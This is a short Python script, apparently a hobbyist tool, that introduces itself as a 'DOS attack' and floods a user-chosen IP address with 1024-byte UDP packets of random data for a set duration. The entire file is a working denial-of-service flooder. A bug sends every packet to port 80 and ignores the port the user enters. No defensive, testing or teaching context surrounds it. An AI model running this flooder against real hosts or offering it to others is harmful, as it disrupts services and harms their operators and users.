import sys
import socket
import os
import time
import random

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)

os.system("clear")


print("Welcome to DOS attack")
print("Author : Debashis Gupta")
print("\n\n")
print("Enter the parameter ")

ip = input("Target IP address : ")
# ip = int(ip)
#
port = int(input("Port : "))

duration = input("Duration of attack : ")
print(type(duration))
timeout = time.time() + float(duration)

sent =0

while True:
    try:
        if(time.time()> timeout):
            break
        else:
            pass

        sock.sendto(bytes,(str(ip),80))
        sent = sent + 1
        print("Sent %s packets to %s through port %s"%(sent,str(ip),80))

    except KeyboardInterrupt:
        sys.exit()